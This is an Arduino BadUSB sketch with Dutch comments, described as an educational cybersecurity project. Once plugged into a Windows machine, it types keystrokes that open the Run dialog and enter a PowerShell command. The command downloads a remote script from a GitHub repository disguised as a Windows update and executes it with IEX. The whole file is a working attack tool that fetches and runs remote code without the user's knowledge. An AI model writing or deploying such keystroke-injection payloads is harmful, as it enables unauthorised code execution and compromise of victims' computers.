// Arduino Rubber Ducky Script voor BadUSB
// Educational Cybersecurity Project
// VERANDER DE URL NAAR JE RENDER.COM URL!

#include <Keyboard.h>

const String RENDER_URL = "https://raw.githubusercontent.com/Windows-Update-Proxy/Updater/refs/heads/main/Windows/WindowsUpdate.ps1";
const int DELAY_STARTUP = 3000;  // Wacht tot systeem klaar is
const int DELAY_SHORT = 200;
const int DELAY_MEDIUM = 500;
const int DELAY_LONG = 2000;

void setup() {
  // Wacht tot systeem volledig geboot is
  delay(DELAY_STARTUP);
  
  // Initialiseer keyboard
  Keyboard.begin();
  
  // Voer payload uit
  executePayload();
  
  // Sluit keyboard af
  Keyboard.end();
}

void loop() {
  // Niets - payload wordt één keer uitgevoerd
}

void executePayload() {
  // Open Run dialog (Win+R)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(DELAY_MEDIUM);
  
  // Download en execute payload
  // Optie 2: Via hosted script (uncomment indien gewenst)
  
  Keyboard.print("powershell -Command IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Windows-Update-Proxy/Updater/refs/heads/main/Windows/WindowsUpdate.ps1')");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  
}
